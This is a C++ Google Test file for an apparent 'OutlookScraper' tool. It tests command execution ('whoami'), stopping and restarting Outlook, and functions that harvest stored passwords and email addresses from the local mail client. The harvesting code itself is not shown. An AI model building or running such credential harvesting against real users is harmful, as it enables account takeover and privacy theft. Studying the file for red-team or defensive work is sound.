#include "pch.h"
#include "..\OutlookScraper\outlook.h"

#define BUFSIZE (2 << 14)

TEST(OutlookScraper, CommandExecutionTest) {
	// Check that execute command works for whoami on Dragon
	char cmd[7] = "whoami";
	EXPECT_TRUE(strstr(executeCmd(cmd).c_str(), "dragon"));
}

TEST(OutlookScraper, StopOutlookTest) {
	// Stop outlook if running
	EXPECT_TRUE(stopOutlook());
}

TEST(OutlookScraper, StartOutlookTest) {
	// Start outlook
	EXPECT_TRUE(startOutlook());
}

TEST(OutlookScraper, CredentialHarvestStopAndRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getCredentials(result_c, BUFSIZE, true, true));
	EXPECT_TRUE(strstr(result_c, "password"));
}

TEST(OutlookScraper, CredentialHarvestStopNoRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getCredentials(result_c, BUFSIZE, true, false));
	EXPECT_TRUE(strstr(result_c, "password"));
}

TEST(OutlookScraper, CredentialHarvestNoStopAndNoRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getCredentials(result_c, BUFSIZE, false, false));
	EXPECT_TRUE(strstr(result_c, "password"));
}

TEST(OutlookScraper, EmailAddressHarvestNoStopNoRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getEmailAddresses(result_c, BUFSIZE, false, false));
	EXPECT_TRUE(strstr(result_c, ".com"));
}

TEST(OutlookScraper, EmailAddressHarvestStopAndNoRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getEmailAddresses(result_c, BUFSIZE, true, false));
	EXPECT_TRUE(strstr(result_c, ".com"));
}

TEST(OutlookScraper, EmailAddressHarvestNoStopAndRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getEmailAddresses(result_c, BUFSIZE, false, true));
	EXPECT_TRUE(strstr(result_c, ".com"));
}

TEST(OutlookScraper, EmailAddressHarvestStopAndRestartTest) {
	//Check that output has password/requires inbox
	char* result_c = new char[BUFSIZE];
	EXPECT_TRUE(getEmailAddresses(result_c, BUFSIZE, true, true));
	EXPECT_TRUE(strstr(result_c, ".com"));
}